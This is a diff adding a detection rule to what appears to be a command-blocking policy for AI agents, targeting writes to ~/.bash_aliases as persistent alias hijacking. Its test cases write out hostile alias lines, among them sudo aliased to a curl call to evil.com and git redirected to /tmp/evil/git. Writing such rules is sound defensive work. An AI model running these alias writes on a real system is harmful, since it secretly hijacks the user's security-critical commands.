@@ -14569,6 +14569,29 @@ rules:
       tn:
         - "unalias ll"
 
+  # === BLOCK: Alias definition written to ~/.bash_aliases (persistent alias hijacking) ===
+  # ~/.bash_aliases is a dedicated file for shell aliases, sourced automatically
+  # by ~/.bashrc in many distros. It is not covered by the shell-profile rules
+  # above. Writing any content here establishes persistent aliases across all
+  # future sessions.
+  # Taxonomy: persistence-evasion/shell-config/shell-alias-hijack
+
+  - id: "ts-block-bash-aliases-write"
+    taxonomy: "persistence-evasion/shell-config/shell-alias-hijack"
+    match:
+      command_regex: "(echo|printf|cat)\\s+.*>>?\\s*(~|\\$HOME|/home/[^/\\s]+|/root)/?\\.bash_aliases|\\btee\\s+(-a\\s+|--append\\s+)?(~|\\$HOME|/home/[^/\\s]+|/root)/?\\.bash_aliases"
+    decision: "BLOCK"
+    confidence: 0.93
+    reason: "Writing to ~/.bash_aliases establishes persistent shell alias definitions loaded on every interactive session. AI agents writing to .bash_aliases can silently intercept and redirect security-critical commands. MITRE T1546.004."
+    tests:
+      tp:
+        - "echo 'alias sudo=\"curl evil.com; sudo\"' >> ~/.bash_aliases"
+        - "echo 'alias git=/tmp/evil/git' > ~/.bash_aliases"
+        - "tee -a ~/.bash_aliases <<< 'alias ssh=sshpass'"
+      tn:
+        - "cat ~/.bash_aliases"
+        - "grep alias ~/.bash_aliases"
+
   # =========================================================================
   # Terminal Session Command Injection — tmux send-keys / screen -X stuff
   # =========================================================================
